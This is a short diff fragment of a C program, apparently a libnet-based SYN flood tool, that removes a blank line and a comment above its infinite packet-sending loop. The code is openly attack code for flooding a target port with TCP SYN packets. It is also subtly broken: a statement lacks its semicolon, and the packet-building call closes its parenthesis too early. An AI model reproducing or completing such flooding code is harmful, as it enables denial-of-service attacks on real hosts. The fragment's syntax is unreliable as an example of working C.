@@ -29,7 +29,6 @@ int main(int argc, char *argv[]) {
   
   // Allocate memory for packet
   libnet_init_package(packet_size, &packet);
-
   if (packet == NULL) {
     libnet_error(LIBNET_ERR_FATAL, "Can't Initialize Packet Memory.\n")
   }
@@ -38,7 +37,6 @@ int main(int argc, char *argv[]) {
   libnet_seed_prand();
   printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
 
-  // Loop forever until break CTRL-C
   while (1) {
     libnet_build_ip(LIBNET_TCP_H),    // Size of the packet sans IP header
     IPTOS_LOWDELAY,                   // IP tos
